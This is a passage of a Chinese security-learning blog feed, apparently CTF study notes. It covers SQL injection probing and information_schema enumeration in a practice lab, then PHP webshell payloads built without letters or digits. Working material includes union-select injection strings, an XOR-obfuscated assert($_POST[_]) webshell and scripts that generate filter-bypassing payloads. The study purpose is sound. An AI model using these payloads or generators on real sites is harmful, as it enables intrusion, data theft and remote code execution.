class="hljs-built_in">select</span>语句查询表的列名<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">解释：<br>(<span class="hljs-built_in">limit</span> 只显示第一条)<br>此处令<span class="hljs-built_in">id</span> = -1 目的是使前一条<span class="hljs-keyword">select</span>语句查询不到结果,然后显示出后面的<span class="hljs-keyword">select</span>语句<br><br>语句：<span class="hljs-keyword">select</span> 1,email_id,3 from emails <br>1：代表临时产生的一列，放在结果集的第一列，列中的值为1<br>email_id： 放在第二列<br>3：代表临时产生的一列，放在结果集的第一列，列中的值为3<br><br></code></pre></td></tr></table></figure><p>将上述代码放在url中执行：可以将email查询到用户名中。</p><p><img src="https://s2.loli.net/2022/11/25/WGoCr5suKFZRzcN.png" alt="image-20221108191426881"></p><img src="https://s2.loli.net/2022/11/25/ebXK7rvldyH52pM.png" alt="image-20221108191320683" style="zoom: 33%;" /><p>注： url中 <strong>%20</strong> 代表空格</p><h2 id="1-4-测试题"><a href="#1-4-测试题" class="headerlink" title="1.4 测试题:"></a>1.4 测试题:</h2><p>参数x有注入，以下那个注入测试正确?           a,b,c</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>. www.xiaodi8.com/news.php?y=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>&amp;x=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">b</span>. www.xiaodi8.com/news.php?y=<span class="hljs-number">1</span>&amp;x=<span class="hljs-number">2</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br><span class="hljs-attribute">c</span>. www .xiaodi8.com/news.php?y=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>&amp;x=<span class="hljs-number">2</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br><span class="hljs-attribute">d</span>. www .xiaodi8.com/news.php?xx=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>&amp;xxx=<span class="hljs-number">2</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><strong>总结：</strong>可控变量，带入数据库查询，变量未存在过滤或过滤不严谨。</p><h2 id="1-5-判断是否存在注入点？"><a href="#1-5-判断是否存在注入点？" class="headerlink" title="1.5 判断是否存在注入点？"></a>1.5 判断是否存在注入点？</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、逻辑值<br>    <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>页面正常<br>    <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>页面异常<br>    则可能存在注入点<br>(在url中加入)<br><br><br><span class="hljs-number">2</span>、<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span><br>通过<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 判断注入的字段数<br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> 如果<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>不报错，<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>，<span class="hljs-number">4</span>报错，说明该表中只有三列，存在<span class="hljs-keyword">sql</span>注入<br>    <br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/NldjoUX49qRnT1G.png" alt="image-20221108192257428" style="zoom:33%;" /><img src="https://s2.loli.net/2022/11/25/b28opylBXFtmKGs.png" alt="image-20221108192154448" style="zoom:33%;" /><h2 id="1-6-信息收集"><a href="#1-6-信息收集" class="headerlink" title="1.6 信息收集"></a>1.6 信息收集</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">sql获得相关信息<br>数据库版本：<span class="hljs-built_in">version</span>()<br>数据库名字：<span class="hljs-built_in">database</span>()<br>数据库用户：<span class="hljs-built_in">user</span>()<br>操作系统：@<span class="hljs-keyword">@version</span>_compile_os   没有括号！<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/w3BdS2XZFJgMKci.png" alt="image-20221108192754857" style="zoom:33%;" /><p>直接在sql语句中写</p><h2 id="1-7-MySQL-5-0-版本探测"><a href="#1-7-MySQL-5-0-版本探测" class="headerlink" title="1.7 MySQL 5.0+版本探测"></a>1.7 MySQL 5.0+版本探测</h2><p>在mysql5.0以后的版本</p><p>存在一个<strong>information_schema</strong>数据库、里面有 所有<em>存储记录</em> 的  <strong>数据库名</strong>、<strong>表名</strong>、<strong>列名</strong>的数据库<br>相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。</p><h3 id="1-7-1-获取相关信息"><a href="#1-7-1-获取相关信息" class="headerlink" title="1.7.1 获取相关信息"></a>1.7.1 获取相关信息</h3><p>可以使用 .  来调用子类</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">information_schema.tables#information_schema下面的所有表名<br>information_schema.columns#information_schema下面所有的列名<br>table_name#表名<br>column_name#列名<br>table_schema#数据库名<br></code></pre></td></tr></table></figure><h4 id="1、查询security数据库下的所有表"><a href="#1、查询security数据库下的所有表" class="headerlink" title="1、查询security数据库下的所有表"></a>1、查询security数据库下的所有表</h4><img src="https://s2.loli.net/2022/11/25/km8XslvoFJxdYIh.png" alt="image-20221108194456608" style="zoom: 33%;" /><h4 id="2、查询users表下的所有列名"><a href="#2、查询users表下的所有列名" class="headerlink" title="2、查询users表下的所有列名"></a>2、查询users表下的所有列名</h4><img src="https://s2.loli.net/2022/11/25/DkSZCU4KTyxIV8p.png" alt="image-20221108195011327" style="zoom: 33%;" /><h2 id="1-8-墨者学院例题"><a href="#1-8-墨者学院例题" class="headerlink" title="1.8 墨者学院例题"></a>1.8 墨者学院例题</h2><img src="https://s2.loli.net/2022/11/25/YuT9EOB1eGHplLD.png" alt="image-20221109185634955" style="zoom:33%;" /><p>点进去发现里面有个公告</p><img src="https://s2.loli.net/2022/11/25/ClKgmyNZRYX3eGj.png" alt="image-20221109185824251" style="zoom:33%;" /><img src="https://s2.loli.net/2022/11/25/P5Fr1KVsv3lX8fO.png" alt="image-20221109185845745" style="zoom: 25%;" /><p><strong>?id&#x3D;1</strong>疑似sql注入点</p><p>判断是否有sql注入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1正常<br>?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2 异常<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/PlDuWjIcGMyhVs1.png" alt="image-20221109190047798" style="zoom:25%;" /><p>说明存在sql注入</p><p>然后判断该表的字段数</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">?<span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>...?<span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>当by后面的数字为5时，页面不正常，说明字段数为4</p><img src="https://s2.loli.net/2022/11/25/FqsIH8TzhcjtLZx.png" alt="image-20221109190305924" style="zoom: 25%;" /><p>然后判断回显的字段是哪几个？</p><img src="https://s2.loli.net/2022/11/25/YVedQtBSIXWk46O.png" alt="image-20221109190440960" style="zoom:25%;" /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">使用union联合查询，注意此时让<span class="hljs-built_in">id</span>=-1 查询不到前面的数据，则会把后半段<span class="hljs-keyword">select</span>语句显示出来<br>此处说明第二列和第三列会被显示<br></code></pre></td></tr></table></figure><p>信息搜集：</p><img src="https://s2.loli.net/2022/11/25/o1VfsFgqildNHt7.png" alt="image-20221109190650848" style="zoom:25%;" /><p><strong>version()</strong>查询mysql版本号，5.0+说明此处可以使用数据库information_schema.tables&#x2F;columns</p><p><strong>database()</strong>查询此数据库名称</p><img src="https://s2.loli.net/2022/11/25/6gdXVcsDljPRSEY.png" alt="image-20221109190909704" style="zoom:25%;" /><p><strong>user()</strong>查询数据库用户名</p><p><strong>@@version_compile_os</strong>查询操作系统名称</p><img src="https://s2.loli.net/2022/11/25/1qg6PfX7FmprV9H.png" alt="image-20221109191151942" style="zoom:25%;" /><p>查询该数据库下的所有表，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">table_name</span> 代表表   table_schema代表数据库,<br><span class="hljs-attribute">information_schema</span>.tables存储了所有表信息（<span class="hljs-number">5</span>.<span class="hljs-number">0</span>+）<br></code></pre></td></tr></table></figure><p>查询该表下的所有字段(列)</p><p><img src="https://s2.loli.net/2022/11/25/ur6RBKVqYSpvLTf.png" alt="image-20221109191553480"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">column_name</span> 代表列名<br><span class="hljs-attribute">information_schema</span>.columns存储了所有列信息（<span class="hljs-number">5</span>.<span class="hljs-number">0</span>+）<br></code></pre></td></tr></table></figure><p>group_concat(列名)把所有结果拼接</p><h2 id="1-9-链接"><a href="#1-9-链接" class="headerlink" title="1.9 链接"></a>1.9 链接</h2><h3 id="1-9-1sqlilabs靶场相关解答"><a href="#1-9-1sqlilabs靶场相关解答" class="headerlink" title="1.9.1sqlilabs靶场相关解答"></a>1.9.1sqlilabs靶场相关解答</h3><p><a href="https://www.yuque.com/office/yuque/0/2022/pdf/2476579/1647239035090-84752d34-43a3-4d21-953e-612760a5e4d7.pdf?from=https://www.yuque.com/weiker/xiaodi/geg7au">https://www.yuque.com/office/yuque/0/2022/pdf/2476579/1647239035090-84752d34-43a3-4d21-953e-612760a5e4d7.pdf?from=https%3A%2F%2Fwww.yuque.com%2Fweiker%2Fxiaodi%2Fgeg7au</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小迪-day12(SQL注入简要概述)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行-无字母数字webshell</title>
    <link href="/2023/08/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/"/>
    <url>/2023/08/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="命令执行-无字母数字webshell"><a href="#命令执行-无字母数字webshell" class="headerlink" title="命令执行-无字母数字webshell"></a>命令执行-无字母数字webshell</h3><p>我们看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>在命令执行中，我们经常会碰到过滤了字母和数字的情况，那如何才能绕过呢？</p><p>我的想法：通过非字母数字来进行一些相关的操作得到我们想要的代码，如：<code>system(&#39;ls&#39;);</code></p><p>我们可以通过一些特殊的字符来得到：^(异或) ~(取反) +(自增)  |(或)</p><h4 id="1、异或"><a href="#1、异或" class="headerlink" title="1、异或"></a>1、异或</h4><p>我们先看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;5&quot;</span>^<span class="hljs-string">&quot;Z&quot;</span>;<br></code></pre></td></tr></table></figure><p>输出: <code>o</code></p><p>我们先来分析一下：字符 “5” 的ascii码是53，其二进制是110101，字母Z的ascii码是90，二进制是1011010</p><p>对照一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0110101</span><br><span class="hljs-number">1011010</span><br>异或：相同为<span class="hljs-number">0</span>，不同为<span class="hljs-number">1</span><br><span class="hljs-number">1101111</span><br></code></pre></td></tr></table></figure><p>异或可得：1101111，转为10进制为 111 ，ascii码为：o</p><p>我们举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">// assert($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>我们可以使用如下异或脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// rce_xor.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># rce_xor.py</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br><br></code></pre></td></tr></table></figure><p>使用方法：</p><p>首先我们先在php脚本中修改正则过滤的表达式，<code>$preg</code> 运行一下php脚本，会生成一个txt文件</p><p>（其中包含了由哪些字符异或可以产生我们想要的结果）然后我们再运行python脚本，输入函数，以及命令即可。</p><p>例如：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">xxx</span>\<span class="hljs-title">scripts</span>&gt;<span class="hljs-title">python</span> <span class="hljs-title">rce_xor.py</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">[+] <span class="hljs-title">your</span> <span class="hljs-title">function</span>：<span class="hljs-title">system</span></span><br><span class="hljs-function">[+] <span class="hljs-title">your</span> <span class="hljs-title">command</span>：<span class="hljs-title">ls</span></span><br><span class="hljs-function">(&quot;%08%02%08%08%05%0<span class="hljs-title">d</span>&quot;^&quot;%7<span class="hljs-title">b</span>%7<span class="hljs-title">b</span>%7<span class="hljs-title">b</span>%7<span class="hljs-title">c</span>%60%60&quot;)(&quot;%0<span class="hljs-title">c</span>%08&quot;^&quot;%60%7<span class="hljs-title">b</span>&quot;);</span><br></code></pre></td></tr></table></figure><p>就生成了一个我们想要的字符串（因为存在一些不可打印字符，所以经过了url编码）</p><h4 id="2、或"><a href="#2、或" class="headerlink" title="2、或"></a>2、或</h4><p>原理类似，脚本改动一下就行：</p><p>rec_or.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span 